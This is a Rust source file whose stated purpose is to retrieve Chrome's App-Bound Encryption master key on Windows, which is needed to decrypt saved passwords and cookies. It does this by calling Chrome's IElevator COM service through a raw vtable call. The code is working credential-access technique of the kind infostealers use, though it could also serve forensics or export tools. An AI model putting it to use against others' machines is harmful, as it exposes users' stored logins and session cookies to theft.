//! Chrome App-Bound Encryption (ABE) master key retrieval via IElevator COM.
//! Required for Chrome 127+ v20 password/cookie blobs on Windows.

#[cfg(target_os = "windows")]
pub fn try_app_bound_master_key(local_state_path: &std::path::Path) -> Option<Vec<u8>> {
    let content = std::fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json
        .pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64,
    )
    .ok()?;

    const APPB: &[u8] = b"APPB";
    if encrypted_key.len() <= APPB.len() || &encrypted_key[..APPB.len()] != APPB {
        return None;
    }

    let blob = &encrypted_key[APPB.len()..];
    decrypt_app_bound_key_via_com(blob)
}

#[cfg(not(target_os = "windows"))]
pub fn try_app_bound_master_key(_local_state_path: &std::path::Path) -> Option<Vec<u8>> {
    None
}

#[cfg(target_os = "windows")]
fn decrypt_app_bound_key_via_com(blob: &[u8]) -> Option<Vec<u8>> {
    use std::ffi::c_void;
    use std::ptr;
    use windows::core::{GUID, HRESULT, Interface};
    use windows::Win32::Foundation::{SysAllocStringByteLen, SysStringByteLen};
    use windows::Win32::System::Com::{
        CoInitializeEx, CoSetProxyBlanket, CoUninitialize, CLSCTX_LOCAL_SERVER,
        COINIT_APARTMENTTHREADED, COLE_DEFAULT_PRINCIPAL, EOAC_DYNAMIC_CLOAKING,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
    };
    use windows::Win32::System::Rpc::{RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT};

    const CLSID_CHROME_ELEVATOR: GUID = GUID::from_u128(0x708860E0_F641_4611_8895_7D867DD3675B);
    const IID_IELEVATOR: GUID = GUID::from_u128(0x463ABECF_410D_407F_8AF5_0DF35A005CC8);
    const RPC_E_CHANGED_MODE: HRESULT = HRESULT(0x80010106u32 as i32);

    type DecryptDataFn = unsafe extern "system" fn(
        this: *mut c_void,
        ciphertext: windows::core::BSTR,
        plaintext: *mut windows::core::BSTR,
        last_error: *mut u32,
    ) -> HRESULT;

    #[link(name = "ole32")]
    unsafe extern "system" {
        fn CoCreateInstance(
            rclsid: *const GUID,
            punkouter: *mut c_void,
            dwclscontext: u32,
            riid: *const GUID,
            ppv: *mut *mut c_void,
        ) -> HRESULT;
    }

    unsafe {
        let hr_init = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let should_uninit = hr_init.is_ok();
        if hr_init.is_err() && hr_init != RPC_E_CHANGED_MODE {
            return None;
        }

        struct ComGuard {
            should_uninit: bool,
        }
        impl Drop for ComGuard {
            fn drop(&mut self) {
                if self.should_uninit {
                    unsafe {
                        CoUninitialize();
                    }
                }
            }
        }
        let _com_guard = ComGuard { should_uninit };

        let mut elevator: *mut c_void = ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_CHROME_ELEVATOR,
            ptr::null_mut(),
            CLSCTX_LOCAL_SERVER.0,
            &IID_IELEVATOR,
            &mut elevator,
        );
        if hr.is_err() || elevator.is_null() {
            return None;
        }

        let unknown = windows::core::IUnknown::from_raw(elevator);
        CoSetProxyBlanket(
            &unknown,
            RPC_C_AUTHN_DEFAULT as u32,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            None,
            EOAC_DYNAMIC_CLOAKING,
        )
        .ok()?;
        std::mem::forget(unknown);

        let vtable = *(elevator as *const *const *const c_void);
        if vtable.is_null() {
            return None;
        }
        let decrypt_data: DecryptDataFn = std::mem::transmute(*vtable.add(5));

        let bstr_in = SysAllocStringByteLen(Some(blob));
        let mut bstr_out = windows::core::BSTR::default();
        let mut last_error = 0u32;
        let hr = decrypt_data(elevator, bstr_in, &mut bstr_out, &mut last_error);
        if hr.is_err() {
            return None;
        }

        let len = SysStringByteLen(&bstr_out);
        if len == 0 {
            return None;
        }

        let raw = std::mem::transmute_copy::<windows::core::BSTR, *const u8>(&bstr_out);
        let bytes = std::slice::from_raw_parts(raw, len as usize).to_vec();
        Some(bytes)
    }
}
